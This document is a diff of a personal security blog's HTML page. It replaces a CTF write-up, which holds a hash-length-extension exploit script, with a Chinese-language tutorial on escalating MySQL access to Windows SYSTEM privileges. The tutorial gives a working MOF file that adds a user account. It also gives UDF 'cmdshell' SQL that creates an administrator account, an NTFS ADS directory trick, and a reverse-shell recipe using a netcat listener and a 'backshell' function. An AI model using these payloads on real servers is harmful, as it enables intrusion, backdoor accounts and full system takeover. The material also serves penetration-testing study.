@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>RCTF-2018 cpushop · Ywc&#39;s blog</title>
+    <title>MySQL提权 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">RCTF-2018 cpushop</a>
+                <a href="#" class="post-name">MySQL提权</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            RCTF-2018 cpushop
+            MySQL提权
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">163</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">1,126</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/05</span>
+                    <span class="post-intro-time">2019/04/16</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,17 +396,44 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>nc连接后，可以看到商品列表，里面有一件商品是flag，需要足够的价格以及相关的sign、timestamp才能购买成功。</p>
-<p><img src="/2018/08/05/RCTF-2018/1.png" alt="RCTF-2018"></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> parse_qsl</span><br><span class="line"><span class="keyword">from</span> hashpumpy <span class="keyword">import</span> hashpump</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.10.55.153'</span>, <span class="number">30197</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'8'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your order:\n'</span>)</span><br><span class="line">order = p.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> order</span><br><span class="line">o = parse_qsl(order)</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> o:</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="string">'sign'</span>):</span><br><span class="line">        sign = v</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sign</span><br><span class="line">data = order[:<span class="number">-70</span>]</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>, <span class="number">32</span>):</span><br><span class="line">    payload = hashpump(sign, data, <span class="string">'&amp;product=Flag'</span>, i)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    new_sign = payload[<span class="number">0</span>]</span><br><span class="line">    new_data = payload[<span class="number">1</span>]</span><br><span class="line">    payload = new_data + <span class="string">'&amp;sign='</span> + new_sign</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+        <h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>在windows平台下</strong>(<code>linux下不可用</code>)，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>mysql用户具有root权限(对上面那个目录可写）<br>关闭了secure-file-priv</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>(1)找一个可写目录上传mof文件，我这里上传到了 <code>C:/wmpub/nullevt.mof</code> 代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user c0de code /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br><span class="line">;</span><br></pre></td></tr></table></figure></p>
+<p>其中的第18行的命令，上传前请自己更改。<br>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来就可以直接执行sql语句把该文件写入到目标路径。<br>(2)执行load_file及into dumpfile把文件导出到正确的位置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure></p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。<br>2.Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。<br>3.掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。<br>4.可以将udf.dll写入到相应目录的权限。</p>
+<blockquote>
+<p>注：关于plugin目录，可在mysql中执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>进行查看，这个目录也就是dll文件需要导入的目录</p>
+</blockquote>
+<h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>udf提权这是最常见的提权方式了，但是往往在执行过程中老是遇到”Can’t open shared library”的情况，这里我们可以利用NTFS ADS流来解决这个问题。<br>1.最常见的是直接使用udf.php此类的工具来执行udf提权，具体如下。<br>连接到mysql以后，先导出udf.dll到c:\windows\system32目录下。<br>2.创建相应的函数并执行命令，具体如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user waitalone waitalone.cn /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators waitalone /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure></p>
+<p>3.某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure></p>
+<h2 id="MySQL反弹Shell提权"><a href="#MySQL反弹Shell提权" class="headerlink" title="MySQL反弹Shell提权"></a>MySQL反弹Shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面udf.dll文件的内容先插入到数据表中，然后再导出到/lib/plugin目录。</p>
+<blockquote>
+<p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p>
+<ul>
+<li>然后创建函数backshell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>在具备独立主机的服务器上执行监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后执行backshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(&quot;你的ip地址&quot;,12345);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/08/05/RCTF-2018/">https://yinwc.github.io/2018/08/05/RCTF-2018/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/08/05/RCTF-2018/">August 5th 2018, 4:53:25 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/04/16/MySQL提权/">https://yinwc.github.io/2019/04/16/MySQL提权/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/04/16/MySQL提权/">April 16th 2019, 8:14:07 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -415,16 +442,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/08/SJU-game/" title= SJU集训结业&淘汰赛 Write Up >
-                    <div class="nextTitle">SJU集训结业&淘汰赛 Write Up</div>
+                <a href= "/2019/04/22/异或/" title= 深入理解异或操作 >
+                    <div class="nextTitle">深入理解异或操作</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/31/Gopher/" title= Gopher攻击MySql >
-                    <div class="prevTitle">Gopher攻击MySql</div>
+                <a href= "/2019/04/15/DDCTF2019/" title= DDCTF2019 >
+                    <div class="prevTitle">DDCTF2019</div>
                 </a>
             
         </li>
@@ -536,7 +563,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF提权"><span class="toc-number">1.</span> <span class="toc-text">MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">1.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方式"><span class="toc-number">1.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF提权"><span class="toc-number">2.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">2.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方式-1"><span class="toc-number">2.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL反弹Shell提权"><span class="toc-number">3.</span> <span class="toc-text">MySQL反弹Shell提权</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
